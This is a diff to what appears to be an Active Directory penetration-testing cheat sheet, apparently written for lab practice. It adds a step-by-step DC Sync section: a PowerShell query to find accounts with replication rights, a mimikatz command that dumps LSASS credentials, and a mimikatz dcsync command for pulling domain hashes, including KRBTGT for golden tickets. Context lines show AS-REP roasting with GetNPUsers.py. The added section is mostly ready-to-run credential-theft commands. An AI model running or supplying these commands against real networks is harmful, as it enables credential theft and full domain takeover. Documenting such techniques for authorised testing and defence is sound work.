@@ -40,6 +40,27 @@ GetNPUsers.py relia.com/ -usersfile users.txt -no-pass -dc-ip 172.16.143.6
 ```
 
 
+## 🔺  DC Sync
+ ### Step 1: Compromise Local Administrator on a Workstation
+ 
+ ### Step 2: Check If any user Has Replication Privileges (sync)
+```
+Get-ObjectACL -DistinguishedName "DC=yourdomain,DC=com" -ResolveGUIDs | ? {($_.ObjectType -match 'replication') -and ($_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner')}
+```
+### Step 3: Dump LSASS for Cached Credentials of domain admin
+```
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+
+### Step 4: Use credentials of Domain Admin to dump credentials
+Why would you do this?
+> Your Domain Admin might not be the only highly privileged user. There might be Enterprise Admins, Service Accounts, or other Domain Admins with different access levels.
+> Using DCSync, you can dump KRBTGT to create golden ticket (end game)
+``` 
+mimikatz.exe "lsadump::dcsync /domain:yourdomain.local /user:DomainAdmin"
+
+```
+
 
 ## 🔺  Silver Ticket
 - Require ((`Service Account password` OR `NTLM hash`)), ((`Domain SID`)) & ((`Target SPN`))
